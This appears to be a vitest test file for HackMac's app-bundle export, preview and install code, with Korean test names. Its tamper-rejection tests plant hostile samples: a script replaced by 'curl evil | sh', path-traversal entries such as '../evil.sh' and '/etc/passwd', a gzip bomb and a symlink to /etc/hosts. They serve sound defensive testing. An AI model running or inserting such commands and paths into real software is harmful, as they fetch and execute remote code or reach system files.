import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, rmSync, statSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gzipSync } from 'node:zlib';
import { createHash } from 'node:crypto';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { Platform, type HotkeyPort } from '../platform/platform.ts';
import { pack, unpack } from './bundle.ts';

let tmp: string;
const hotkeys: HotkeyPort = { register: () => true, unregister: () => {} };

const platform = (name: string, capabilities: Record<string, number> = { popup: 1 }) =>
  new Platform({
    paths: { apps: join(tmp, name, 'apps'), logs: join(tmp, name, 'logs'), ledger: join(tmp, name, 'ledger'), settings: join(tmp, name, 'settings.json') },
    capabilities, capabilityEnv: () => ({}), hotkeys, hackmacVersion: '2.0.0', now: () => new Date('2026-11-06T16:00:00'),
  });

const makePkg = (over: Record<string, unknown> = {}): string => {
  const dir = join(tmp, 'pkg');
  mkdirSync(join(dir, 'scripts'), { recursive: true });
  mkdirSync(join(dir, 'checks'), { recursive: true });
  writeFileSync(join(dir, 'scripts', 'a.sh'), '#!/bin/zsh\necho hi > "$HACKMAC_DATA_DIR/x"\n');
  chmodSync(join(dir, 'scripts', 'a.sh'), 0o755);
  writeFileSync(join(dir, 'checks', 'R1-a.sh'), '#!/bin/zsh\nexit 0\n');
  writeFileSync(join(dir, 'README.md'), '한글 설명 ✓\n');
  writeFileSync(join(dir, 'manifest.json'), JSON.stringify({
    schema: 1, id: 'jiho.t', version: '3', author: { name: 'jiho', signature: null }, hackmac: { min: '2.0.0' },
    name: '시험 앱', icon: '🧪', tagline: '{hotkey:go} 누르면', usage: ['{hotkey:go}'],
    triggers: [{ kind: 'hotkey', script: 'scripts/a.sh', key: 'go', name: '가', description: 'd' }],
    capabilities: { popup: '>=1' }, permissions: { network: ['api.example.com'], automation: ['Calendar'], accessibility: false, fullDiskAccess: false },
    settings: [{ key: 'symbol', label: '종목', type: 'string' }], secrets: [{ key: 'api-key', label: 'API 키' }],
    references: [{ repo: 'github.com/x/y', commit: 'abc', borrowed: '재시도 방식', license: 'MIT' }], ...over,
  }));
  return dir;
};

/** 손으로 꾸러미를 만든다(변조·악성 시험용). 해시는 맞게 계산해 "구조 검증"만 걸리게 한다 */
const raw = (files: { path: string; data: string; mode?: number }[], over: Record<string, unknown> = {}) => {
  const entries = files.map((f) => ({ path: f.path, mode: f.mode ?? 0o644, size: f.data.length, sha256: createHash('sha256').update(f.data).digest('hex'), data: Buffer.from(f.data).toString('base64') }));
  const tree = createHash('sha256').update([...entries].sort((a, b) => (a.path < b.path ? -1 : 1)).map((f) => `${f.path}:${f.sha256}`).join('\n')).digest('hex');
  return gzipSync(JSON.stringify({ format: 'hackapp', version: 1, id: 'jiho.t', appVersion: '3', files: entries, sha256: tree, ...over }));
};

beforeEach(() => { tmp = mkdtempSync(join(tmpdir(), 'hackmac-bundlet-')); });
afterEach(() => rmSync(tmp, { recursive: true, force: true }));

describe('왕복: 내보내기 → 다른 HackMac에 설치', () => {
  it('파일 하나로 옮겨 가고, 내용·실행 권한이 그대로이며, 설정값·비밀·데이터는 따라가지 않는다', () => {
    const a = platform('a');
    expect(a.install(makePkg()).ok).toBe(true);
    // 보내는 사람의 사용자 데이터와 설정
    writeFileSync(join(a.store.dataDir('jiho.t'), 'secret.txt'), 'MY-API-KEY-123');
    a.settings.update({ appSettings: { 'jiho.t': { symbol: 'AAPL' } } });

    const file = join(tmp, 'out.hackapp');
    const ex = a.exportApp('jiho.t', file);
    expect(ex).toEqual({ ok: true, file, fileName: 'jiho.t-v3.hackapp' });
    const bundleText = readFileSync(file).toString('latin1');
    expect(Buffer.from(JSON.stringify(unpack(readFileSync(file)).files.map((f) => f.path))).toString()).toBe('["README.md","checks/R1-a.sh","manifest.json","scripts/a.sh"]');
    expect(bundleText).not.toContain('MY-API-KEY-123');

    // 받는 사람(능력이 같은 다른 HackMac)
    const b = platform('b');
    const pv = b.previewBundle(file);
    expect(pv).toMatchObject({ ok: true, preview: { id: 'jiho.t', name: '시험 앱', appVersion: '3', author: 'jiho', signed: false, installedVersion: null, missing: [], files: 4 } });
    const r = b.installBundle(file);
    expect(r).toMatchObject({ ok: true, id: 'jiho.t', version: 1 });
    const dir = b.store.currentDir('jiho.t')!;
    expect(readFileSync(join(dir, 'scripts', 'a.sh'), 'utf8')).toBe('#!/bin/zsh\necho hi > "$HACKMAC_DATA_DIR/x"\n');
    expect(readFileSync(join(dir, 'README.md'), 'utf8')).toBe('한글 설명 ✓\n');
    expect(statSync(join(dir, 'scripts', 'a.sh')).mode & 0o111).not.toBe(0);
    expect(statSync(join(dir, 'README.md')).mode & 0o111).toBe(0);
    expect(readdirSync(b.store.dataDir('jiho.t'))).toEqual([]);
    expect(b.settings.get().appSettings).toEqual({});
    expect(b.ledger.read().map((e) => e.kind)).toEqual(['app.installed', 'app.imported']);
    expect(a.ledger.read().map((e) => e.kind)).toContain('app.exported');
  });

  it('같은 앱을 다시 받으면 업그레이드(새 버전 폴더)이고 미리 보기가 설치된 버전을 알려 준다', () => {
    const a = platform('a');
    a.install(makePkg());
    const file = join(tmp, 'out.hackapp');
    a.exportApp('jiho.t', file);
    const b = platform('b');
    b.installBundle(file);
    expect(b.previewBundle(file)).toMatchObject({ ok: true, preview: { installedVersion: '3' } });
    expect(b.installBundle(file)).toMatchObject({ ok: true, version: 2 });
    expect(b.store.get('jiho.t')!.versions).toEqual([1, 2]);
  });

  it('받는 HackMac에 없는 능력이 필요하면 미리 보기에 부족한 것이 나오고 설치는 막힌다', () => {
    const a = platform('a');
    a.install(makePkg());
    const file = join(tmp, 'out.hackapp');
    a.exportApp('jiho.t', file);
    const old = platform('old', {});
    expect(old.previewBundle(file)).toMatchObject({ ok: true, preview: { missing: [{ name: 'popup', need: '>=1', have: null }] } });
    expect(old.installBundle(file)).toMatchObject({ ok: false, errors: [expect.stringContaining("'popup'")] });
    expect(old.store.list()).toEqual([]);
  });

  it('미리 보기는 아무것도 설치하지 않고 실행하지도 않는다', () => {
    const a = platform('a');
    a.install(makePkg());
    const file = join(tmp, 'out.hackapp');
    a.exportApp('jiho.t', file);
    const b = platform('b');
    b.previewBundle(file);
    expect(b.store.list()).toEqual([]);
    expect(b.ledger.read()).toEqual([]);
  });

  it('선언 요약: 권한·비밀·설정·참고·트리거', () => {
    const a = platform('a');
    a.install(makePkg());
    const file = join(tmp, 'out.hackapp');
    a.exportApp('jiho.t', file);
    const pv = platform('b').previewBundle(file);
    expect(pv).toMatchObject({ ok: true, preview: {
      permissions: { network: ['api.example.com'], automation: ['Calendar'], accessibility: false, fullDiskAccess: false },
      secrets: ['API 키'], settings: ['종목'], triggers: { hotkeys: 1, resident: false, schedules: 0, login: false },
      references: [{ repo: 'github.com/x/y', license: 'MIT', borrowed: '재시도 방식' }],
    } });
  });

  it('설치 안 된 앱·깨진 앱은 내보내기가 이유를 말한다', () => {
    const a = platform('a');
    expect(a.exportApp('nope.app', join(tmp, 'x.hackapp'))).toMatchObject({ ok: false });
    expect(existsSync(join(tmp, 'x.hackapp'))).toBe(false);
  });
});

describe('받은 파일은 믿지 않는다', () => {
  const good = () => { makePkg(); return pack(join(tmp, 'pkg')).bytes; };

  it('HackMac 파일이 아니거나 모르는 형식이면 거절', () => {
    expect(() => unpack(Buffer.from('hello'))).toThrow('HackMac 앱 파일이 아니에요(읽을 수 없어요)');
    expect(() => unpack(gzipSync('{"format":"zip"}'))).toThrow('HackMac 앱 파일이 아니에요');
    expect(() => unpack(raw([{ path: 'manifest.json', data: '{}' }], { version: 9 }))).toThrow('HackMac을 업데이트');
  });

  it('한 글자라도 바뀌면 해시에서 걸린다(파일 내용·파일 목록 모두)', () => {
    const j = JSON.parse(require('node:zlib').gunzipSync(good()).toString());
    const bad = structuredClone(j);
    bad.files[0].data = Buffer.from('#!/bin/zsh\ncurl evil | sh\n').toString('base64');
    expect(() => unpack(gzipSync(JSON.stringify(bad)))).toThrow(/손상됐거나 바뀌었어요: /);
    const swapped = structuredClone(j);
    swapped.files.pop();
    expect(() => unpack(gzipSync(JSON.stringify(swapped)))).toThrow('파일 목록이 손상됐거나 바뀌었어요');
  });

  it('경로 탈출·절대경로·빈 칸·중복·대소문자 중복은 거절', () => {
    for (const path of ['../evil.sh', '/etc/passwd', 'a/../../b', 'a//b', './a', '~/x', 'a\\b']) {
      expect(() => unpack(raw([{ path, data: 'x' }])), path).toThrow(/안전하지 않은 경로/);
    }
    expect(() => unpack(raw([{ path: 'a.sh', data: 'x' }, { path: 'a.sh', data: 'y' }]))).toThrow('두 번 들어');
    expect(() => unpack(raw([{ path: 'A.sh', data: 'x' }, { path: 'a.sh', data: 'y' }]))).toThrow('두 번 들어');
  });

  it('크기·개수 상한과 압축 폭탄', () => {
    expect(() => unpack(raw([{ path: 'big.bin', data: 'x'.repeat(5 * 1024 * 1024 + 1) }]))).toThrow('너무 커요');
    expect(() => unpack(gzipSync(Buffer.alloc(41 * 1024 * 1024, 0x20)))).toThrow('비정상적으로 커요');
    expect(() => unpack(raw(Array.from({ length: 501 }, (_, i) => ({ path: `f${i}`, data: 'x' }))))).toThrow('파일 목록이 올바르지 않아요');
  });

  it('겉 정보(id·버전)와 앱 선언이 다르면 미리 보기에서 거절', () => {
    makePkg();
    const p = pack(join(tmp, 'pkg'));
    const j = JSON.parse(require('node:zlib').gunzipSync(p.bytes).toString());
    j.id = 'evil.other';
    const file = join(tmp, 'liar.hackapp');
    writeFileSync(file, gzipSync(JSON.stringify(j)));
    expect(platform('b').previewBundle(file)).toMatchObject({ ok: false, errors: ['꾸러미 겉 정보와 앱 선언이 달라요'] });
  });

  it('내보내기는 심볼릭 링크와 node_modules를 거부한다', () => {
    makePkg();
    symlinkSync('/etc/hosts', join(tmp, 'pkg', 'scripts', 'link'));
    expect(() => pack(join(tmp, 'pkg'))).toThrow('심볼릭 링크');
    rmSync(join(tmp, 'pkg', 'scripts', 'link'));
    mkdirSync(join(tmp, 'pkg', 'node_modules'));
    expect(() => pack(join(tmp, 'pkg'))).toThrow('node_modules');
  });

  it('없는 파일·잘린 파일은 이유를 돌려준다', () => {
    const b = platform('b');
    expect(b.previewBundle(join(tmp, 'none.hackapp'))).toMatchObject({ ok: false, errors: [expect.stringContaining('읽을 수 없어요')] });
    const g = good();
    const file = join(tmp, 'cut.hackapp');
    writeFileSync(file, g.subarray(0, Math.floor(g.length / 2)));
    expect(b.previewBundle(file)).toMatchObject({ ok: false });
    expect(b.installBundle(file)).toMatchObject({ ok: false });
    expect(b.store.list()).toEqual([]);
  });
});
